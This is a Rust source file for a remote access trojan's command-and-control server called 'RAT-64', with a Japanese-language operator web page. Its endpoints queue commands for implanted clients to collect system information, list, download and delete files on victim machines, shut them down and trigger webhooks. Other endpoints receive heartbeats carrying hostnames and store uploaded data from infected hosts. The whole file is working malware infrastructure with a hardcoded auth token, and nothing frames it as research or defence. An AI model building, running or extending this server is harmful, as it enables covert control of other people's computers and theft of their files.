use std::{convert::Infallible, net::SocketAddr, sync::Arc};

use bytes::Bytes;
use chrono::Utc;
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{header::{HeaderValue, CONTENT_TYPE}, Method, Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tokio::{net::TcpListener, sync::{Mutex, Notify}, time};
use rat_64::core::config::{load_config_or_default, Config};

const AUTH_TOKEN: &str = "SECURE_TOKEN_32_CHARS_MINIMUM_LEN";
const PORT: u16 = 8080;

#[derive(Serialize, Deserialize, Clone, Debug)]
struct Command {
    id: String,
    command_type: String,
    parameters: Vec<String>,
    timestamp: u64,
    auth_token: String,
}

struct AppState {
    command_queue: Mutex<Vec<Command>>,
    response_log: Mutex<Vec<Value>>,
    config: Arc<Config>,
    notify: Notify,
}

fn unix_time() -> u64 { Utc::now().timestamp() as u64 }

fn json_response(v: Value, status: StatusCode) -> Response<Full<Bytes>> {
    let body = serde_json::to_vec(&v).unwrap_or_else(|_| b"{}".to_vec());
    let mut resp = Response::new(Full::new(Bytes::from(body)));
    *resp.status_mut() = status;
    resp.headers_mut().insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
    resp
}

fn unauthorized() -> Response<Full<Bytes>> {
    json_response(json!({"error": "Unauthorized"}), StatusCode::UNAUTHORIZED)
}

fn is_authorized(req: &Request<Incoming>) -> bool {
    if let Some(h) = req.headers().get("Authorization").and_then(|h| h.to_str().ok()) {
        if let Some(token) = h.strip_prefix("Bearer ") {
            return token == AUTH_TOKEN;
        }
    }
    false
}

fn log_request(method: &Method, endpoint: &str, remote: &SocketAddr, data: Option<&Value>) {
    let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S");
    println!("[{}] {} {} - {}", timestamp, method, endpoint, remote);
    if let Some(d) = data {
        if let Ok(s) = serde_json::to_string_pretty(d) { println!("  Data: {}", s); }
    }
}

fn parse_query_param(req: &Request<Incoming>, key: &str) -> Option<String> {
    req.uri().query().and_then(|q| {
        for pair in q.split('&') {
            let mut it = pair.splitn(2, '=');
            let k = it.next()?;
            let v = it.next().unwrap_or("");
            if k == key { return Some(v.to_string()); }
        }
        None
    })
}

fn parse_query_bool(req: &Request<Incoming>, key: &str) -> bool {
    match parse_query_param(req, key).as_deref() {
        Some("1") | Some("true") | Some("yes") => true,
        _ => false,
    }
}

fn parse_query_u64(req: &Request<Incoming>, key: &str, default_: u64) -> u64 {
    parse_query_param(req, key).and_then(|v| v.parse::<u64>().ok()).unwrap_or(default_)
}

fn html_response(html: &str) -> Response<Full<Bytes>> {
    let mut resp = Response::new(Full::new(Bytes::from(html.to_owned())));
    *resp.status_mut() = StatusCode::OK;
    resp.headers_mut().insert(
        CONTENT_TYPE,
        HeaderValue::from_static("text/html; charset=utf-8"),
    );
    // Cache無効化（UIの更新が即時反映されるように）
    resp.headers_mut().insert(
        hyper::header::CACHE_CONTROL,
        HeaderValue::from_static("no-store, no-cache, must-revalidate, max-age=0"),
    );
    resp.headers_mut().insert(
        hyper::header::PRAGMA,
        HeaderValue::from_static("no-cache"),
    );
    resp.headers_mut().insert(
        hyper::header::EXPIRES,
        HeaderValue::from_static("0"),
    );
    resp
}

fn index_page(queue_size: usize, resp_count: usize) -> String {
    format!(
        r#"<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <title>RAT-64 C2 Server (Debug)</title>
  <style>
    body {{ font-family: Arial, sans-serif; margin: 24px; }}
    .grid {{ display: grid; gap: 12px; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }}
    button {{ padding: 10px 14px; font-size: 14px; cursor: pointer; }}
    .card {{ border: 1px solid #ddd; padding: 16px; border-radius: 8px; }}
    .small {{ color:#666; font-size: 12px; }}
  </style>
  <script>
    function post(path, body) {{
      const opts = {{ method: 'POST' }};
      if (body !== undefined) {{
        opts.headers = {{ 'Content-Type': 'application/json' }};
        opts.body = JSON.stringify(body);
      }}
      fetch(path, opts)
        .then(_ => location.reload())
        .catch(e => alert('POST failed: ' + e));
    }}
    
    function fileInfo() {{
      const path = document.getElementById('file_path').value;
      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
      post('/ui/add-file-info', {{ path: path }});
    }}
    
    function downloadFile() {{
      const path = document.getElementById('file_path').value;
      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
      post('/ui/add-download-file', {{ path: path }});
    }}
    
    function deleteFile() {{
      const path = document.getElementById('file_path').value;
      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
      if (!confirm('本当に削除しますか？: ' + path)) return;
      post('/ui/add-delete-file', {{ path: path }});
    }}
    
    function createDir() {{
      const path = document.getElementById('dir_path').value;
      if (!path) {{ alert('ディレクトリパスを入力してください'); return; }}
      post('/ui/add-create-dir', {{ path: path }});
    }}
  </script>
</head>
<body>
  <h1>RAT-64 C2 Server (Debug)</h1>
  <p class="small">Queue: {queue} / Responses: {resp}</p>
  <div class="grid">
    <div class="card">
      <h3>コマンド投入</h3>
      <button type="button" onclick="post('/ui/add-status')">Add Status</button>
      <button type="button" onclick="post('/ui/add-ping')">Add Ping</button>
      <button type="button" onclick="post('/ui/add-collect')">Add Collect System Info</button>
      <button type="button" onclick="post('/ui/add-shutdown')">Add Shutdown</button>
    </div>
    <div class="card">
      <h3>ファイル管理</h3>
      <button type="button" onclick="post('/ui/add-list-files')">📁 List Files (Current Dir)</button>
      <button type="button" onclick="post('/ui/add-list-files-win')">🪟 List Files (C:\\)</button>
      <input type="text" id="file_path" placeholder="ファイルパス..." style="width: 200px; margin: 5px;">
      <button type="button" onclick="fileInfo()">📄 File Info</button>
      <button type="button" onclick="downloadFile()">⬇️ Download File</button>
      <button type="button" onclick="deleteFile()">🗑️ Delete File</button>
      <input type="text" id="dir_path" placeholder="ディレクトリパス..." style="width: 200px; margin: 5px;">
      <button type="button" onclick="createDir()">📂 Create Directory</button>
    </div>
    <div class="card">
      <h3>Webhook</h3>
      <button type="button" onclick="post('/ui/queue-webhook')">今すぐ送信（クライアント経由）</button>
    </div>
  </div>
  <p class="small">このページの操作は認証不要（デバッグ用途）。クライアントAPIはBearer認証が必要です。</p>
</body>
</html>"#,
        queue = queue_size,
        resp = resp_count
    )
}

async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>) -> Result<Response<Full<Bytes>>, Infallible> {
    let method = req.method().clone();
    let path = req.uri().path().to_string();

    match (method.clone(), path.as_str()) {
        (Method::GET, "/") => {
            let q = state.command_queue.lock().await;
            let r = state.response_log.lock().await;
            let page = index_page(q.len(), r.len());
            Ok(html_response(&page))
        }

        // UI state (JSON)
        (Method::GET, "/ui/state") => {
            let q = state.command_queue.lock().await;
            let r = state.response_log.lock().await;
            let recent: Vec<Value> = r.iter().rev().take(20).cloned().collect();
            Ok(json_response(json!({
                "queue_count": q.len(),
                "responses": recent
            }), StatusCode::OK))
        }

        // UI buttons (no auth) ------------------------------------------
        (Method::POST, "/ui/add-status") => {
            let id = format!("status_{}", Utc::now().timestamp_millis());
            let cmd = Command { id: id.clone(), command_type: "status".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
            state.command_queue.lock().await.push(cmd.clone());
            state.notify.notify_waiters();
            println!("[UI] Status command added: {}", id);
            Ok(json_response(json!({"ok": true}), StatusCode::OK))
        }
        (Method::POST, "/ui/add-ping") => {
            let id = format!("ping_{}", Utc::now().timestamp_millis());
            let cmd = Command { id: id.clone(), command_type: "ping".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
            state.command_queue.lock().await.push(cmd.clone());
            state.notify.notify_waiters();
            println!("[UI] Ping command added: {}", id);
            Ok(json_response(json!({"ok": true}), StatusCode::OK))
        }
        (Method::POST, "/ui/add-collect") => {
            let id = format!("collect_{}", Utc::now().timestamp_millis());
            let cmd = Command { id: id.clone(), command_type: "collect_system_info".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
            state.command_queue.lock().await.push(cmd.clone());
            state.notify.notify_waiters();
            println!("[UI] CollectSystemInfo command added: {}", id);
            Ok(json_response(json!({"ok": true}), StatusCode::OK))
        }
        (Method::POST, "/ui/add-shutdown") => {
            let id = format!("shutdown_{}", Utc::now().timestamp_millis());
            let cmd = Command { id: id.clone(), command_type: "shutdown".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
            state.command_queue.lock().await.push(cmd.clone());
            state.notify.notify_waiters();
            println!("[UI] Shutdown command added: {}", id);
            Ok(json_response(json!({"ok": true}), StatusCode::OK))
        }

        // ファイル管理コマンド
        (Method::POST, "/ui/add-list-files") => {
            let id = format!("list_files_{}", Utc::now().timestamp_millis());
            let cmd = Command { id: id.clone(), command_type: "list_files".into(), parameters: vec![".".to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
            state.command_queue.lock().await.push(cmd.clone());
            state.notify.notify_waiters();
            println!("[UI] List files command added: {}", id);
            Ok(json_response(json!({"ok": true}), StatusCode::OK))
        }
        (Method::POST, "/ui/add-list-files-win") => {
            let id = format!("list_files_win_{}", Utc::now().timestamp_millis());
            let cmd = Command { id: id.clone(), command_type: "list_files".into(), parameters: vec!["C:\\".to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
            state.command_queue.lock().await.push(cmd.clone());
            state.notify.notify_waiters();
            println!("[UI] List files (C:\\) command added: {}", id);
            Ok(json_response(json!({"ok": true}), StatusCode::OK))
        }
        (Method::POST, "/ui/add-file-info") => {
            let body = match req.into_body().collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(_) => Bytes::new(),
            };
            match serde_json::from_slice::<serde_json::Value>(&body) {
                Ok(data) => {
                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
                        let id = format!("file_info_{}", Utc::now().timestamp_millis());
                        let cmd = Command { id: id.clone(), command_type: "get_file_info".into(), parameters: vec![path.to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
                        state.command_queue.lock().await.push(cmd.clone());
                        state.notify.notify_waiters();
                        println!("[UI] File info command added: {} (path: {})", id, path);
                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
                    } else {
                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
                    }
                }
                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
            }
        }
        (Method::POST, "/ui/add-download-file") => {
            let body = match req.into_body().collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(_) => Bytes::new(),
            };
            match serde_json::from_slice::<serde_json::Value>(&body) {
                Ok(data) => {
                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
                        let id = format!("download_{}", Utc::now().timestamp_millis());
                        let cmd = Command { id: id.clone(), command_type: "download_file".into(), parameters: vec![path.to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
                        state.command_queue.lock().await.push(cmd.clone());
                        state.notify.notify_waiters();
                        println!("[UI] Download file command added: {} (path: {})", id, path);
                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
                    } else {
                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
                    }
                }
                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
            }
        }
        (Method::POST, "/ui/add-delete-file") => {
            let body = match req.into_body().collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(_) => Bytes::new(),
            };
            match serde_json::from_slice::<serde_json::Value>(&body) {
                Ok(data) => {
                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
                        let id = format!("delete_{}", Utc::now().timestamp_millis());
                        let cmd = Command { id: id.clone(), command_type: "delete_file".into(), parameters: vec![path.to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
                        state.command_queue.lock().await.push(cmd.clone());
                        state.notify.notify_waiters();
                        println!("[UI] Delete file command added: {} (path: {})", id, path);
                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
                    } else {
                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
                    }
                }
                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
            }
        }
        (Method::POST, "/ui/add-create-dir") => {
            let body = match req.into_body().collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(_) => Bytes::new(),
            };
            match serde_json::from_slice::<serde_json::Value>(&body) {
                Ok(data) => {
                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
                        let id = format!("create_dir_{}", Utc::now().timestamp_millis());
                        let cmd = Command { id: id.clone(), command_type: "create_dir".into(), parameters: vec![path.to_string(), "true".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
                        state.command_queue.lock().await.push(cmd.clone());
                        state.notify.notify_waiters();
                        println!("[UI] Create directory command added: {} (path: {})", id, path);
                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
                    } else {
                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
                    }
                }
                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
            }
        }

        // Queue webhook send command (client will send the webhook)
        (Method::POST, "/ui/queue-webhook") => {
            let id = format!("webhook_{}", Utc::now().timestamp_millis());
            let cmd = Command { id: id.clone(), command_type: "webhook_send".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
            state.command_queue.lock().await.push(cmd.clone());
            state.notify.notify_waiters();
            println!("[UI] Webhook-send command queued: {}", id);
            Ok(json_response(json!({"ok": true}), StatusCode::OK))
        }

        // Client endpoints ---------------------------------------------

        // Client endpoints ---------------------------------------------
        (Method::GET, "/api/commands/fetch") => {
            log_request(&method, &path, &remote, None);
            if !is_authorized(&req) { return Ok(unauthorized()); }
            let client_id = parse_query_param(&req, "client_id").unwrap_or_else(|| "unknown".into());
            let wait = parse_query_bool(&req, "wait");
            let timeout_secs = parse_query_u64(&req, "timeout", 25);

            let mut cmds: Vec<Command> = {
                let mut q = state.command_queue.lock().await;
                q.drain(..).collect()
            };
            if cmds.is_empty() && wait {
                let _ = time::timeout(std::time::Duration::from_secs(timeout_secs), state.notify.notified()).await;
                let mut q = state.command_queue.lock().await;
                cmds = q.drain(..).collect();
            }
            if !cmds.is_empty() { println!("  → Returning {} command(s) for client: {}", cmds.len(), client_id); }
            Ok(json_response(serde_json::to_value(cmds).unwrap_or_else(|_| json!([])), StatusCode::OK))
        }

        (Method::POST, "/api/commands/response") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            let body = match req.into_body().collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(_) => Bytes::new(),
            };
            match serde_json::from_slice::<Value>(&body) {
                Ok(mut data) => {
                    log_request(&Method::POST, "/api/commands/response", &remote, Some(&data));
                    if let Some(obj) = data.as_object_mut() {
                        obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
                        obj.insert("server_timestamp".into(), Value::from(unix_time()));
                    }
                    state.response_log.lock().await.push(data);
                    Ok(json_response(json!({"status":"received"}), StatusCode::OK))
                }
                Err(_) => Ok(json_response(json!({"error":"No JSON data provided"}), StatusCode::BAD_REQUEST))
            }
        }

        (Method::POST, "/api/heartbeat") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            let body = match req.into_body().collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(_) => Bytes::new(),
            };
            match serde_json::from_slice::<Value>(&body) {
                Ok(data) => {
                    log_request(&Method::POST, "/api/heartbeat", &remote, Some(&data));
                    let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
                    let hostname  = data.get("hostname").and_then(|v| v.as_str()).unwrap_or("unknown");
                    let status    = data.get("status").and_then(|v| v.as_str()).unwrap_or("unknown");
                    println!("  → Heartbeat from {}@{}: {}", client_id, hostname, status);
                    Ok(json_response(json!({"status":"received"}), StatusCode::OK))
                }
                Err(_) => Ok(json_response(json!({"error":"No JSON data provided"}), StatusCode::BAD_REQUEST))
            }
        }

        (Method::POST, "/api/data/upload") => {
            if !is_authorized(&req) { return Ok(unauthorized()); }
            let body = match req.into_body().collect().await {
                Ok(collected) => collected.to_bytes(),
                Err(_) => Bytes::new(),
            };
            match serde_json::from_slice::<Value>(&body) {
                Ok(upload) => {
                    let client_id = upload.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
                    let data_type = upload.get("data_type").and_then(|v| v.as_str()).unwrap_or("unknown");
                    let filename = format!("uploaded_data_{}_{}.json", client_id, unix_time());
                    if let Err(e) = std::fs::write(&filename, serde_json::to_string_pretty(&upload).unwrap_or_else(|_| "{}".into())) {
                        eprintln!("Failed to save {}: {}", filename, e);
                        return Ok(json_response(json!({"error":"Failed to save file"}), StatusCode::INTERNAL_SERVER_ERROR));
                    }
                    println!("  → Data upload from {}: {} saved to {}", client_id, data_type, filename);
                    Ok(json_response(json!({"status":"uploaded","filename":filename}), StatusCode::OK))
                }
                Err(_) => Ok(json_response(json!({"error":"No JSON data provided"}), StatusCode::BAD_REQUEST))
            }
        }

        _ => Ok(json_response(json!({"error":"Not Found"}), StatusCode::NOT_FOUND)),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let cfg = Arc::new(load_config_or_default());
    let state = Arc::new(AppState {
        command_queue: Mutex::new(Vec::new()),
        response_log: Mutex::new(Vec::new()),
        config: cfg.clone(),
        notify: Notify::new(),
    });

    println!("============================================================");
    println!("🚀 RAT-64 Hyper Test Server");
    println!("============================================================");
    println!("Server URL: http://localhost:{}", PORT);
    println!("Auth Token: {}", AUTH_TOKEN);
    println!("\nUI: open http://localhost:{PORT}/ to enqueue commands and send webhook.");
    println!("  POST /test/add-status");
    println!("  POST /test/add-ping");
    println!("  POST /test/add-collect-system-info");
    println!("  POST /test/add-shutdown");
    println!("  POST /test/webhook/enable");
    println!("  POST /test/webhook/disable");
    println!("  POST /test/webhook/set-url   (JSON: {{\"url\":\"...\", \"type\":\"Discord\"}} optional)");
    println!("  POST /test/webhook/send");
    println!("\nClient endpoints (Authorization required):");
    println!("  GET  /api/commands/fetch?client_id=...");
    println!("  POST /api/commands/response");
    println!("  POST /api/heartbeat");
    println!("  POST /api/data/upload");
    println!("\nListening on http://0.0.0.0:{}", PORT);

    let listener = TcpListener::bind(("0.0.0.0", PORT)).await?;
    loop {
        let (stream, peer) = listener.accept().await?;
        let state = state.clone();
        tokio::spawn(async move {
            let io = TokioIo::new(stream);
            let service = service_fn(move |req| handle(req, peer, state.clone()));
            if let Err(err) = http1::Builder::new().serve_connection(io, service).await {
                eprintln!("Error serving connection: {:#}", err);
            }
        });
    }
}
